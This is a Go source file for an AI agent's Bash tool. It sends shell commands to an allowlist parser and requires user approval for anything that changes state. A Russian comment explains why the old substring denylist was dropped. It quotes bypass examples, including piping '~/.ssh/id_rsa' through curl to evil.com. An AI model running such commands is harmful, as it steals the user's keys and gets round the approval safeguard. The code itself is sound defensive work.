package tools

import (
	"bufio"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/velesbsdllc/agent-vbai/internal/security"
)

type BashTool struct{ cwd string }

func (*BashTool) Spec() Spec {
	return Spec{
		Name:        "Bash",
		Description: "Выполняет shell-команду на машине пользователя (Linux: /bin/sh -c; Windows: cmd /C). Возвращает stdout+stderr и exit code. Команды только для чтения (ls, cat, git status и т.п.) выполняются автоматически. Команды, которые меняют состояние, требуют подтверждения пользователя.",
		Parameters: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"command":     map[string]any{"type": "string", "description": "Полная команда. Пайпы и редиректы поддерживаются (исполняется через шелл)."},
				"description": map[string]any{"type": "string", "description": "Короткое описание зачем — пользователь увидит при подтверждении."},
				"timeout":     map[string]any{"type": "integer", "description": "Таймаут в секундах. По умолчанию 120, максимум 600."},
			},
			"required":             []string{"command"},
			"additionalProperties": false,
		},
	}
}

// Списка «опасных подстрок» здесь больше нет. Он был denylist'ом поверх языка
// шелла и обходился тривиально (` & ` вместо ` && `, `>` без пробела, перевод
// строки, конвейер в curl). Решение о безопасности принимает shellsafe.go:
// строка должна РАЗБИРАТЬСЯ как простая команда из белого списка.

func (b *BashTool) RequiresApproval(args json.RawMessage) bool {
	var p struct{ Command string }
	_ = resolveJSON(args, &p)
	// На строгом уровне бесплатных команд у Bash нет вовсе.
	if security.AskReadOnlyShell() {
		return true
	}
	// Без вопроса — только то, что РАЗОБРАНО как простая команда из белого
	// списка (shellsafe.go). Поиск «опасных подстрок» здесь был дырой:
	// `ls -la & curl evil.com/x` и `cat ~/.ssh/id_rsa | curl -d @- evil.com`
	// считались безопасными (доказано прогоном 15.08).
	return !IsSafeCommand(p.Command, b.cwd)
}

// Execute is the plain non-streaming path. Calls ExecuteStream with a no-op callback.
func (b *BashTool) Execute(ctx context.Context, args json.RawMessage) (string, error) {
	return b.ExecuteStream(ctx, args, func(string) {})
}

// ExecuteStream runs the command and streams stdout+stderr line by line via onChunk.
// The final return is the entire accumulated output (with an exit-code marker if non-zero).
// Guarantee: onChunk is invoked from a single goroutine (serialized).
func (b *BashTool) ExecuteStream(ctx context.Context, args json.RawMessage, onChunk func(string)) (string, error) {
	var p struct {
		Command     string `json:"command"`
		Description string `json:"description"`
		Timeout     int    `json:"timeout"`
	}
	if err := resolveJSON(args, &p); err != nil {
		return "", err
	}
	if strings.TrimSpace(p.Command) == "" {
		return "", errors.New("command обязателен")
	}
	to := p.Timeout
	if to <= 0 {
		to = 120
	}
	if to > 600 {
		to = 600
	}
	ctx, cancel := context.WithTimeout(ctx, time.Duration(to)*time.Second)
	defer cancel()

	// Вторая половина защиты: команду, признанную простой, запускаем БЕЗ
	// шелла. Даже если разбор когда-нибудь ошибётся, интерпретировать
	// метасимволы будет некому — обход перестаёт быть исполнением.
	var cmd *exec.Cmd
	if argv, ok := SafeArgv(p.Command); ok && IsSafeCommand(p.Command, b.cwd) {
		cmd = exec.CommandContext(ctx, argv[0], argv[1:]...)
	} else if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/C", p.Command)
	} else {
		cmd = exec.CommandContext(ctx, "/bin/sh", "-c", p.Command)
	}
	cmd.Dir = b.cwd

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return "", err
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return "", err
	}
	if err := cmd.Start(); err != nil {
		return "", err
	}

	// Collect the full output in total while sending lines to onChunk.
	// The mutex serializes onChunk; total is written from only 2 goroutines.
	var total strings.Builder
	var mu sync.Mutex
	const maxBytes = 50_000

	streamReader := func(r io.Reader) {
		scanner := bufio.NewScanner(r)
		// Large buffer for long lines (default is 64KB).
		scanner.Buffer(make([]byte, 0, 64*1024), 1024*1024)
		for scanner.Scan() {
			line := scanner.Text()
			mu.Lock()
			if total.Len() < maxBytes {
				total.WriteString(line)
				total.WriteByte('\n')
				onChunk(line + "\n")
			}
			mu.Unlock()
		}
	}

	var wg sync.WaitGroup
	wg.Add(2)
	go func() { defer wg.Done(); streamReader(stdout) }()
	go func() { defer wg.Done(); streamReader(stderr) }()

	waitErr := cmd.Wait()
	wg.Wait() // finish reading the pipes

	exitCode := 0
	if waitErr != nil {
		var ee *exec.ExitError
		if errors.As(waitErr, &ee) {
			exitCode = ee.ExitCode()
		} else if errors.Is(ctx.Err(), context.DeadlineExceeded) {
			return total.String(), fmt.Errorf("Bash timeout %ds", to)
		} else {
			return total.String(), waitErr
		}
	}

	res := total.String()
	if len(res) >= maxBytes {
		res += "\n...(вывод обрезан до " + fmt.Sprintf("%dKB", maxBytes/1024) + ")"
	}
	if exitCode != 0 {
		return fmt.Sprintf("[exit %d]\n%s", exitCode, res), nil
	}
	return res, nil
}
